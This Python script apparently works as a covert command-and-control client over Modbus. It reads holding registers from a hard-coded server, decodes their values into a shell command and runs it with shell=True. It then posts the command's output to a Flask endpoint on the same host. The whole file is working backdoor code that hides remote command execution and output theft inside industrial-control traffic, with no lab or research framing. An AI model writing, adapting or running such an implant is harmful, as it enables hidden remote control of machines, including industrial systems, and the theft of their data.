import asyncio
import logging
from pymodbus.client import AsyncModbusTcpClient
import subprocess
import requests

# Configure logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# Modbus server parameters
MODBUS_SERVER_IP = '10.211.4.109'  # Server IP
MODBUS_SERVER_PORT = 5020        # Server Port

# Flask server URL to send command output
FLASK_SERVER_URL = 'http://10.211.4.109:5000/receive_output'

async def read_holding_registers(client, address, count):
    log.info(f"Attempting to read {count} holding register(s) starting from address {address}...")
    result = await client.read_holding_registers(address, count)

    if result.isError():
        log.error(f"Modbus Error: {result}")
        return None

    return result.registers

async def auto_detect_and_read():
    async with AsyncModbusTcpClient(MODBUS_SERVER_IP, port=MODBUS_SERVER_PORT) as client:
        log.info(f"Connecting to Modbus server at {MODBUS_SERVER_IP}:{MODBUS_SERVER_PORT}")
        await client.connect()

        if not client.connected:
            log.error("Failed to connect to Modbus server.")
            return None

        address = 0  # Start searching from address 0
        max_address = 100  # Limit to avoid endless searching
        
        while address < max_address:
            count = 1
            registers = await read_holding_registers(client, address, count)

            if registers is not None and any(registers):  # Non-zero data detected
                detected_registers = [registers[0]]
                address += 1  # Move to the next address to continue reading

                while address < max_address:
                    count = 1
                    next_registers = await read_holding_registers(client, address, count)

                    if next_registers is not None and any(next_registers):  # Non-zero data detected
                        detected_registers.append(next_registers[0])
                        address += 1  # Move to the next address
                    else:
                        break  # Stop if we hit a zero value

                log.info(f"Detected data starting from address {address - len(detected_registers)} with count {len(detected_registers)}")
                return address - len(detected_registers), len(detected_registers), detected_registers
            
            address += 1  
        
        log.error("Could not detect any valid data.")
        return None, None, None

def execute_dir_command(command):
    # Execute the command
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    # Prepare the command output
    output = {
        "stdout": result.stdout,  # Standard output of the command
        "stderr": result.stderr   # Error output (if any)
    }

    # Send the output to the Flask server
    send_command_output_to_flask(output)

def send_command_output_to_flask(output):
    try:
        # Send a POST request with the output to the Flask server
        response = requests.post(FLASK_SERVER_URL, json=output)
        
        if response.status_code == 200:
            log.info("Successfully sent command output to Flask server.")
        else:
            log.error(f"Failed to send command output. Server responded with status code {response.status_code}.")
    except Exception as e:
        log.error(f"Error sending command output to Flask server: {e}")

def registers_to_string(registers):
    # Convert the register values to characters
    characters = [chr(value) for value in registers]  # Use value directly since they are already integers
    result_string = ''.join(characters)
    return result_string

async def main():
    address, count, registers = await auto_detect_and_read()

    if address is not None and count is not None and registers is not None:
        log.info(f"Automatically detected address: {address}, count: {count}")
        log.info(f"Read register(s): {registers}")
        
        # Convert registers to a command string
        command_string = registers_to_string(registers)
        log.info(f"Text DATA: {command_string}")

        # Execute the command only if it's a valid non-empty string
        if command_string:
            log.info("Executing command...")
            execute_dir_command(command_string)
        else:
            log.error("No valid command to execute.")
    else:
        log.error("Failed to detect valid registers or read data.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Client is shutting down...")
    except Exception as e:
        log.error(f"Unexpected error during execution: {e}")
